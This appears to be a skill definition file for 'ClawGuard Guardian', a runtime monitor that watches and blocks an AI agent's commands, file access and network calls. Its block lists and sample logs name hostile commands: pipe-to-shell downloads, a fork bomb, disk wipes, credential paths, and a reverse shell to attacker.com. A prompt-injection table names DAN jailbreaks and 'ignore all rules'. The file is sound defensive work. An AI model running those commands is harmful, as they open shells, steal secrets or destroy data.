---
name: clawguard-guardian
description: ClawGuard Guardian v3 - Runtime guardian with behavior monitoring, interception, session freeze/replay, and emergency response
metadata:
  category: security
---

# 🛡️ ClawGuard Guardian (CG-GD) v3

Runtime guardian for monitoring, intercepting, and controlling AI agent operations. Provides real-time behavior monitoring, risk-based interception, session replay, and emergency freeze capabilities.

## When to Use

Activate ClawGuard Guardian when:
- A user asks to start guardian or monitoring
- User asks to view status or logs
- User asks to replay or freeze sessions
- Emergency response is needed
- User asks "start monitoring" or "show status"

## How to Execute

### Command 1: Start Monitoring

```
User: Start guardian
Agent:
🛡️ Guardian starting...
   Session ID: session-xxx
   Status: ACTIVE
   Monitoring: Commands, Files, Network, Prompt Injections
```

### Command 2: View Status

```
User: Show status
Agent:
╔═══════════════════════════════════════════════════════════════╗
║                 🛡️ Guardian Status                      ║
╠═══════════════════════════════════════════════════════════════╣
║  Current Status: 🟢 ACTIVE                              ║
║  Session ID: session-xxx                               ║
║  Operations: XXX                                       ║
║  Blocked: X                                            ║
║  Frozen Sessions: X                                    ║
╚═══════════════════════════════════════════════════════════════╝
```

### Command 3: Freeze Session

```
User: Freeze session
Agent:
🛡️ Session frozen: session-xxx
   Time: YYYY-MM-DD HH:MM:SS
   Pending ops: X

   Type "unfreeze" to resume.
```

### Command 4: Replay Session

```
User: Replay session
Agent:
📺 Session Replay:
   ✅ [10:30:01] Command: ls -la
   ✅ [10:30:05] File: Read /tmp/test.txt
   🚫 [10:30:10] File: /etc/passwd (BLOCKED)
   ✅ [10:30:15] Network: api.github.com
```

### Command 5: View Logs

```
User: Show logs
Agent:
📜 Recent Logs (50 lines):
   🟢 [10:30:01] ls -la /workspace
   🟢 [10:30:05] Read /tmp/test.txt
   🚫 [10:30:10] Try Read /etc/passwd (BLOCKED)
```

## Monitoring Capabilities

### Type 1: Command Monitoring

Guardian monitors executed commands:

| Pattern | Risk | Action |
|---------|------|--------|
| `rm -rf /home` | 🔴 CRITICAL | BLOCK |
| `curl\|sh` | 🔴 CRITICAL | BLOCK |
| `nc -e` | 🔴 CRITICAL | BLOCK |
| `sudo su` | 🟠 HIGH | WARN |
| `rm -rf` | 🟠 HIGH | CONFIRM |
| `chmod 777` | 🟠 HIGH | CONFIRM |

### Type 2: File Operation Monitoring

| Pattern | Risk | Action |
|---------|------|--------|
| `/.ssh/` | 🔴 CRITICAL | BLOCK |
| `/.aws/` | 🔴 CRITICAL | BLOCK |
| `/.kube/` | 🔴 CRITICAL | BLOCK |
| `/etc/` | 🟠 HIGH | CONFIRM |
| `/root/` | 🔴 CRITICAL | BLOCK |
| `/.env` | 🟠 HIGH | WARN |

### Type 3: Network Monitoring

| Pattern | Risk | Action |
|---------|------|--------|
| `.onion` | 🔴 CRITICAL | BLOCK |
| `evil.com` | 🔴 CRITICAL | BLOCK |
| Unknown domains | 🟡 MEDIUM | LOG |
| External API | 🟡 MEDIUM | LOG |

### Type 4: Prompt Injection Monitoring

| Pattern | Risk | Action |
|---------|------|--------|
| `DAN` jailbreak | 🔴 CRITICAL | BLOCK |
| `ignore all rules` | 🟠 HIGH | WARN |
| Zero-width chars | 🟠 HIGH | STRIP |
| Role hijacking | 🟡 MEDIUM | LOG |

## Interception Rules

### Path Rules

```javascript
const PATH_RULES = {
  // Absolute deny
  DENY: [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/sudoers',
    '/etc/cron.d',
    '/root/.*',
    '/.ssh/.*',
    '/.aws/.*',
    '/.kube/.*',
    '/.docker/.*'
  ],

  // Confirm required
  CONFIRM: [
    '/etc/',
    '/var/',
    '/usr/local/'
  ],

  // Allowed (whitelist)
  ALLOW: [
    '/tmp/.*',
    '/workspace/.*',
    '~/projects/.*'
  ]
};
```

### Command Rules

```javascript
const COMMAND_RULES = {
  // Absolute deny
  DENY: [
    'rm -rf /',
    'rm -rf /home',
    'rm -rf /root',
    ':(){ :|:& };:',  // Fork bomb
    'dd if=.*of=/dev/',
    'mkfs',
    'fdisk',
    'curl.*\\|.*sh',
    'wget.*\\|.*sh',
    'nc -e',
    '/dev/tcp/'
  ],

  // Confirm required
  CONFIRM: [
    'rm -rf',
    'chmod 777',
    'chmod +x',
    'killall',
    'pkill',
    'shutdown',
    'reboot'
  ]
};
```

### Network Rules

```javascript
const NETWORK_RULES = {
  // Deny hosts
  DENY_HOSTS: [
    '*.onion',
    '*.i2p',
    'evil.com',
    'attacker.com',
    'malicious.com'
  ],

  // Confirm ports
  CONFIRM_PORTS: [22, 23, 25, 3306, 5432, 6379, 27017],

  // Max upload size
  MAX_UPLOAD_SIZE: 10 * 1024 * 1024  // 10MB
};
```

## Session Management

### Session States

| State | Description | Actions Available |
|-------|-------------|-----------------|
| `ACTIVE` | Currently running | Monitor, Block, Freeze |
| `FROZEN` | Paused | Unfreeze, Replay, Export |
| `COMPLETED` | Finished | Replay, Export |
| `TERMINATED` | Emergency stop | Archive |

### Freeze Actions

When a session is frozen:
1. All pending operations are paused
2. No new operations can start
3. Evidence is preserved
4. User is notified

```
🛡️ SESSION FROZEN
────────────────────────────────────────
Session ID: session-xxx
Frozen at: YYYY-MM-DD HH:MM:SS
Operations pending: X
Last operation: Read /etc/passwd

Type "unfreeze session-xxx" to resume.
```

### Unfreeze Actions

```
User: Unfreeze session-xxx
Agent:
✅ Session unfrozen: session-xxx
   Resumed at: YYYY-MM-DD HH:MM:SS
   Pending operations: X
```

## Audit Logging

### Log Format

```json
{
  "timestamp": "YYYY-MM-DDTHH:mm:ss.sssZ",
  "sessionId": "session-xxx",
  "type": "operation|block|freeze|unfreeze",
  "action": "command|file|network",
  "target": "/path/to/resource",
  "result": "SUCCESS|BLOCKED|FROZEN",
  "riskLevel": "INFO|WARNING|HIGH|CRITICAL",
  "details": {}
}
```

### Log Storage

- Location: `~/.clawguard/logs/`
- Format: `audit-YYYY-MM-DD.jsonl`
- Rotation: 100MB per file, 10 files max
- Retention: 30 days

## Response Actions

### Risk-Based Responses

| Risk Level | Icon | Response | Guardian Action |
|------------|------|----------|----------------|
| INFO | 🟢 | Allow | Log only |
| WARNING | 🟡 | Allow + Warn | Log + Alert |
| HIGH | 🟠 | Confirm | Ask user |
| CRITICAL | 🔴 | Block | Auto-block + Alert |

### Automated Responses

| Detection | Guardian Response |
|-----------|------------------|
| SSH key access | Block + Freeze |
| Reverse shell | Kill + Block + Alert |
| Data exfiltration | Block + Freeze + Preserve |
| Fork bomb | Block immediately |
| Mass file delete | Block + Confirm |

## Session Replay

### Replay Format

```
📺 Session Replay: session-xxx
────────────────────────────────────────
Start: YYYY-MM-DD HH:MM:SS
Duration: XX minutes
Operations: XX

Timeline:
🟢 [10:30:01] Command: ls -la /workspace
🟢 [10:30:05] Read: /tmp/data.json
🟢 [10:30:10] Write: /workspace/output.txt
🟢 [10:30:15] Network: GET api.github.com
🟡 [10:30:20] Read: /var/log/syslog (WARNING)
🚫 [10:30:25] Write: /etc/cron.d/malware (BLOCKED)
🟢 [10:30:30] Command: git status

────────────────────────────────────────
Blocked: 1 | Warnings: 1 | Allowed: 6
```

### Export Options

```
# Export as JSON
session export session-xxx --format json

# Export as report
session export session-xxx --format report

# Export evidence
session export session-xxx --evidence
```

## Quick Commands Reference

| Command | Description |
|---------|-------------|
| `start` | Start Guardian monitoring |
| `status` | Show current status |
| `freeze [id]` | Freeze session |
| `unfreeze [id]` | Unfreeze session |
| `replay [id]` | Replay session |
| `logs [lines]` | Show recent logs |
| `export [id]` | Export session |

## Guardian Integration

### With Auditor

```
[Skill Installation]
         │
         ▼
┌─────────────────┐
│  ClawGuard      │
│  Auditor        │
│  (Pre-flight)   │
└────────┬────────┘
         │ APPROVED
         ▼
┌─────────────────┐
│  ClawGuard      │◄──────── Guardian monitors
│  Guardian       │          ongoing operations
│  (Runtime)     │
└────────┬────────┘
         │
         ▼
    [Safe Operation]
```

### With Detect

```
[Threat Detected]
         │
         ▼
┌─────────────────┐
│  ClawGuard      │
│  Detect         │
└────────┬────────┘
         │ CRITICAL
         ▼
┌─────────────────┐
│  ClawGuard      │
│  Guardian       │
│  (Auto-freeze)  │
└─────────────────┘
```

## Output Format Examples

### Status Output

```
╔═══════════════════════════════════════════════════════════════╗
║                 🛡️ Guardian Status                      ║
╠═══════════════════════════════════════════════════════════════╣
║  Status:        🟢 ACTIVE                             ║
║  Session ID:    session-xxx                             ║
║  Start Time:   YYYY-MM-DD HH:MM:SS                     ║
╠═══════════════════════════════════════════════════════════════╣
║  Operations:   128                                   ║
║  Blocked:       3                                     ║
║  Warnings:      12                                    ║
║  Frozen:        0                                    ║
╠═══════════════════════════════════════════════════════════════╣
║  Monitoring:    Commands ✓ Files ✓ Network ✓ Injections  ║
╚═══════════════════════════════════════════════════════════════╝
```

### Freeze Confirmation

```
╔═══════════════════════════════════════════════════════════════╗
║  🛡️ SESSION FROZEN                                      ║
╠═══════════════════════════════════════════════════════════════╣
║  Session: session-xxx                                   ║
║  Frozen: YYYY-MM-DD HH:MM:SS                           ║
║  Reason: CRITICAL threat detected                       ║
║  Last Op: nc -e /bin/bash attacker.com 4444            ║
╠═══════════════════════════════════════════════════════════════╣
║  Pending: 3 operations                                 ║
║  Evidence: Preserved                                    ║
╚═══════════════════════════════════════════════════════════════╝

Type "unfreeze session-xxx" to resume.
```

## v3 vs v2 Features

| Feature | v2 | v3 |
|---------|----|----|
| Command Monitoring | Basic | ✅ |
| File Monitoring | Basic | ✅ |
| Network Monitoring | Basic | ✅ |
| **Session Freeze** | ❌ | **✅ (v3)** |
| **Session Replay** | ❌ | **✅ (v3)** |
| **Evidence Preservation** | ❌ | **✅ (v3)** |
| **Auto-freeze on Critical** | ❌ | **✅ (v3)** |
| **Rule Engine** | ❌ | **✅ (v3)** |
| **Audit Export** | ❌ | **✅ (v3)** |
| **Integration with Detect** | ❌ | **✅ (v3)** |

---

*ClawGuard Guardian: Vigilant protection, real-time control.* 🛡️
